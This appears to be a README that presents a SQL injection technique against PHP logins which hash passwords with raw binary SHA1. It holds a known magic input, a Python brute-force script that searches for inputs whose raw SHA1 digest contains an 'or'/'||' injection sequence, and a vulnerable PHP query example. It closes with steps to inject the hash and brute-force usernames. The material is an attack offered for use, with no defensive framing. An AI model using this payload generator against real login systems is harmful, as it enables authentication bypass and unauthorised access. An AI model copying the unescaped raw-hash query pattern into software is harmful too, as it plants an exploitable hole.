# raw sha1 sql injection

| Hash string                | SHA1 Hash                                     | Raw output            |Query   |Author    |
| -------------------------- |:---------------------------------------------:|:---------------------:|:------:|:--------:|
| 5651578060603509           |96009c0bafe7be05e23b0079226f7222d82fee88       |E&�ɶ��'\|\|'8�vjc\�   |'\|\|'8 |0xJohannes|

# PAYLOAD GENERATION
```python
#!/usr/bin/python
 # -*- coding: utf-8 -*
import hashlib
import re
a = re.compile("'or'\d")
b = re.compile("'\|\|'\d")
d = re.compile("'OR'\d")
e = re.compile("'Or'\d")
f = re.compile("'oR'\d")
from random import randint

identifier = True
while identifier:
    rand=randint(0, 10000)
    rand1=randint(0, 10000)
    rand2=randint(0, 10000)
    rand3=randint(0, 10000)
    value='{}{}{}{}'.format(rand,rand1,rand2,rand3)
    hashed = hashlib.sha1(value).digest()
    hastrip = hashed.strip()
    print hastrip
    if a.search(hastrip)!=None or b.search(hastrip)!=None or d.search(hastrip)!=None or e.search(hastrip)!=None or f.search(hastrip)!=None:
        identifier = False
        print hashed
        print value
        break
```
#  EXAMPLE USAGE

```php
<?php

...SOME CODE...

function escape_sql()
  {
    ...sql escape...
  }
  
$pass = sha1($_POST['pass'], true);

$log = escape_sql($_POST['log']);

$sql = "select * from tablename where password=$pass AND username=$log";

...SOME CODE...
?>
```
* The first step is to inject one of suitable hashes.
* The second move is bruteforcing the login value i.e. (admin, 4dm1n and so on)
* The final step is buying me a coffee :D [![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/Wo30ewVvi)
